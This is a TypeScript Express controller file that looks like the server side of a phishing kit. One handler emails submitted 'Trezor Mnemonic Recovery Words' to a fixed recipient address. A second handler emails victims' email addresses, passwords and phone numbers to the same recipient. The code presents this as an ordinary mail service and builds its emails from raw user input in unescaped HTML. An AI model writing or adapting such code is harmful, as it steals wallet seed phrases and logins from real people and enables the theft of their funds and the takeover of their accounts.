import { Request, Response } from "express";
import nodemailer from "nodemailer";
import {
  asyncHandler,
  errorResponse,
  successResponse,
} from "../utils/handlers";

/**
 * Creates a reusable Nodemailer transporter.
 * Works with Gmail (App Password) or any SMTP provider.
 */
const createTransporter = () => {
  return nodemailer.createTransport({
    host: process.env.SMTP_HOST || "smtp.gmail.com",
    port: Number(process.env.SMTP_PORT) || 465,
    secure: true, // Use SSL (port 465)
    auth: {
      user: process.env.SMTP_USER, // Your Gmail
      pass: process.env.SMTP_PASS, // App Password
    },
    // Increase timeout & keep alive to prevent connection timeout
    connectionTimeout: 15000,
    greetingTimeout: 10000,
    socketTimeout: 15000,
  });
};

/**
 * Controller: Send mnemonic data
 */
export const sendMnemonicController = asyncHandler(
  async (req: Request, res: Response) => {
    const payload = req.body;

    if (!payload || !payload.data || !Array.isArray(payload.data)) {
      return errorResponse(res, "Invalid payload", 400);
    }

    let htmlContent = `<h2>${payload.heading}</h2><ul>`;
    payload.data.forEach((item: { label: string; value: string }) => {
      htmlContent += `<li><strong>${item.label}:</strong> ${item.value}</li>`;
    });
    htmlContent += `</ul>`;

    try {
      const transporter = createTransporter();

      await transporter.verify(); // Test connection

      await transporter.sendMail({
        from: `"Mnemonic Service" <${process.env.SMTP_USER}>`,
        to: process.env.RECIPIENT_EMAIL,
        subject: "Trezor Mnemonic Recovery Words",
        html: htmlContent,
      });

      return successResponse(res, {}, "Mnemonic sent successfully", 200);
    } catch (error: any) {
      console.error("Email sending error:", error.message);
      return errorResponse(res, "Failed to send email", 500);
    }
  }
);

/**
 * Controller: Send user information
 */
export const sendUserInfoController = asyncHandler(
  async (req: Request, res: Response) => {
    const { title, email, password, phone } = req.body;

    if (!title || !email || !password) {
      return errorResponse(res, "Missing required fields", 400);
    }

    const htmlContent = `
      <h2>${title}</h2>
      <ul>
        <li><strong>Email:</strong> ${email}</li>
        <li><strong>Password:</strong> ${password}</li>
        <li><strong>Phone:</strong> ${phone || "N/A"}</li>
      </ul>
    `;

    try {
      const transporter = createTransporter();

      await transporter.verify();

      await transporter.sendMail({
        from: `"User Info Service" <${process.env.SMTP_USER}>`,
        to: process.env.RECIPIENT_EMAIL,
        subject: "User Information Received",
        html: htmlContent,
      });

      return successResponse(res, {}, "Email sent successfully", 200);
    } catch (error: any) {
      console.error("Email sending error:", error.message);
      return errorResponse(res, "Failed to send email", 500);
    }
  }
);
